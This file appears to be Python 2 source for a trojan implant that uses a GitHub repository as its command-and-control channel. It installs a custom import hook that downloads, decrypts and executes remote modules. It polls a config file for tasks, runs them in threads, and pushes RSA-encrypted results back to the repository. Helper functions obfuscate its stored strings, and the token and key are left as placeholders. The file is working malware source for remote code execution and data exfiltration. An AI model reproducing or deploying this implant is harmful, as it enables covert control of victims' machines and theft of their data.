import json as $000
import base64 as $001
import sys as $002
import time as $003
import imp as $004
import threading as $005
import Queue as $006
import zlib as $007
import zipfile as $008
import StringIO as $009
import xxhash as $010
from Crypto.PublicKey import RSA as $011
from Crypto.Cipher import PKCS1_OAEP as $012
from github3 import login as $013

class Config:
	def __init__($014):
		$014.mod = "modules/"
		$014.config = "config/"
		$014.data = "data/"
		$014.repo = "wendigo_test"
		$014.usr = "daniellohrey"
		$014.token = "INSERT TOKEN"
		$014.pk = "INSERT PUBLIC KEY"
		$014.pwd = "password"
		$014.sleep = "10"
		$014.fn_s = "fn_mod"
		$014.id_s = "id_slp"
		$014.imp = "import %s"
		$014.size = "256"
		$014.size = int($014.fixstr($014.size))
		$014.sleep = int($014.fixstr($014.sleep))
		$014.tasks = $006.Queue()
		$014.u_id()
		$014.u_pk($014.pk)

	def u_id($015):
		$016 = int($003.time())
		$017 = str($016) + $015.fixstr($015.id_s)
		$015.id = str($010.xxh64($017).hexdigest())
		$015.id = $015.obfstr($015.id)

	def g_id($018):
		return $018.fixstr($018.id)

	def g_mod($019):
		return $019.fixstr($019.mod)

	def u_mod($020, $021):
		$020.mod = $020.obfstr($021)
		return

	def g_config($022):
		return $022.fixstr($022.config) + $022.g_id()

	def u_config($023, $024):
		$023.config = $023.obfstr($024)
		return

	def g_data($025):
		return $025.fixstr($025.data) + $025.id() + "/" + $025.g_fn()

	def u_data($026, $027):
		$026.data = $026.obfstr($027)
		return

	def g_usr($028):
		return $028.fixstr($028.usr)

	def u_usr($029, $030):
		$029.usr = $029.obfstr($030)
		return

	def g_token($031):
		return $001.b64decode($031.fixstr($031.token))

	def u_token($032, $033):
		$032.token = $032.obfstr($001.b64encode($033))
		return

	def g_repo($034):
		return $034.fixstr($034.repo)

	def u_repo($035, $036):
		$035.repo = $035.obfstr($036)
		return

	def u_pk($037, $038):
		$038 = $001.b64decode($037.fixstr($038))
		$037.pk = $038
		$037.pk = $011.importKey($037.pk)
		$037.pk = $012.new($037.pk)
		return

	def g_pwd($039):
		return $039.fixstr($039.pwd)

	def u_pwd($040, $041):
		$040.pwd = $040.obfstr($041)
		return

	def g_fn($042):
		$043 = int($003.time())
		$044 = str($043) + $042.fixstr($042.fn_s)
		return $010.xxh64($044).hexdigest()

	def g_com($045):
		$046 = str($003.time())
		return $010.xxh64($046).hexdigest()

	def g_imp($047):
		return $047.fixstr($047.imp)

	def g_fn_s($048):
		return $048.fixstr($048.fn_s)

	def g_id_s($049):
		return $049.fixstr($049.id_s)

	def u_id_s($050, $051):
		$050.id_s = $050.obfstr($051)
		return

	def u_fn_id($052, $053):
		$052.fn_s = $052.obfstr($053)
		return

	def fixstr($054, $055):
		$056 = 0
		$057 = ""
		for $058 in $055:
			if $056 % 2 == 1:
				$057 += $058
			$056 += 1
		return $057

	def obfstr($059, $060):
		$062 = int($003.time())
		$063 = str($062) + $059.fixstr($059.id_s)
		$064 = str($010.xxh64($063).hexdigest())
		$065 = 0
		$061 = ""
		for $066 in $060:
			$061 += $064[$065 % len($064)]
			$061 += $066
			$065 += 1
		$061 += $064[$065 % len($064)]
		return $061

class ReImp(object):
	def __init__(self):
		self.code = ""

	def find_module(self, fullname, path=None):
		lib = get_file(config.g_mod() + fullname)
		if lib is not None:
			self.code = lib
			return self
		return None

	def load_module(self,name):
		module = $004.new_module(name)
		exec self.code in module.__dict__
		$002.modules[name] = module
		return module

def connect():
	gh = $013(token = config.g_token())
	repo = gh.repository(config.g_usr(), config.g_repo())
	return repo

def get_file(path):
	try:
		repo = connect()
		return decrypt(repo.file_contents(path).decoded)
	except:
		return None

def create_config():
	repo = connect()
	repo.create_file(config.g_config(), config.g_com(), config.g_com())
	return

def get_config():
	c_json = get_file(config.g_config())
	try:
		c_dict = $000.loads(c_json)
		for mod in c_dict:
			if mod[config.fn_s] not in $002.modules:
				exec(config.g_imp() % mod[config.fn_s])
		return c_dict
	except:
		return None

def clear_config():
	repo = connect()
	repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())

def push_data(data):
	repo = connect()
	repo.create_file(config.g_data(), config.g_com(), encrypt(data))
	return

def decrypt(data):
	decoded = $001.b64decode(data)
	s_io = $009.StringIO(decoded)
	zipped = $008.ZipFile(s_io, 'r')
	uzip = zipped.read(config.fn_s, config.g_pwd())
	zipped.close()
	s_io.close()
	return uzip

def encrypt(data):
	key = config.g_pk()
	size = config.size
	offset = 0
	encrypted = ""
	compressed = $007.compress(data)
	while offset < len(compressed):
		chunk = compressed[offset:offset+size]
		if len(chunk) % size != 0:
			chunk += " " * (size - len(chunk))
		encrypted += key.encrypt(chunk)
		offset += size
	return $001.b64encode(encrypted)

def run_module(**task):
	try:
		global config
		conf, result = $002.modules[task[config.fn_s]].run(config, **task)
		if conf is not None:
			config = conf
		while True:
			try:
				if result is not None:
					push_data(result)
				else:
					push_data(config.g_com())
				return
			except:
				$003.sleep(config.sleep)
	except:
		return

def module_runner():
	while not config.tasks.empty():
		task = config.tasks.get()
		t = $005.Thread(target=run_module, kwargs = task)
		t.start()
		try:
			$003.sleep(int(task[config.id_s]))
		except:
			pass
	return

config = Config()
$002.meta_path = [ReImp()]
while True:
	try:
		create_config()
		break
	except:
		$003.sleep(config.sleep)
while True:
	if config.tasks.empty():
		config_file = get_config()
		if config_file == None:
			$003.sleep(config.sleep)
			continue
		for task in config_file:
			config.tasks.put(task)
	if not config.tasks.empty():
		module_runner()
		while True:
			try:
				clear_config()
				break
			except:
				$003.sleep(config.sleep)
